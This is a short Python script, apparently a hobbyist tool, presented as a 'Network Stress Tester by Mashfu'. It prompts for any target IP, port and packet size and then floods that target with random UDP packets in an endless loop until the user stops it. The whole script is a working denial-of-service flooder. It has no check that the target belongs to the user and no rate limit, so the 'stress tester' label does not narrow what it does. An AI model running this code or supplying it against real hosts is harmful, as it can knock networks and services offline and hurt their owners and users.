import socket
import random
import os

# স্ক্রিন ক্লিয়ার করা
os.system("clear")

print("=========================================")
print("   Network Stress Tester by Mashfu🕷️      ")
print("=========================================")

target_ip = input("Target IP: ")
target_port = int(input("Target Port: "))
packet_size = int(input("Packet Size (e.g. 1024): "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(packet_size)

print(f"\nSending packets to {target_ip} on port {target_port}...")

sent = 0
try:
    while True:
        sock.sendto(bytes_to_send, (target_ip, target_port))
        sent += 1
        print(f"Sent {sent} packets to {target_ip}", end="\r")
except KeyboardInterrupt:
    print("\n\nStopped by user.")

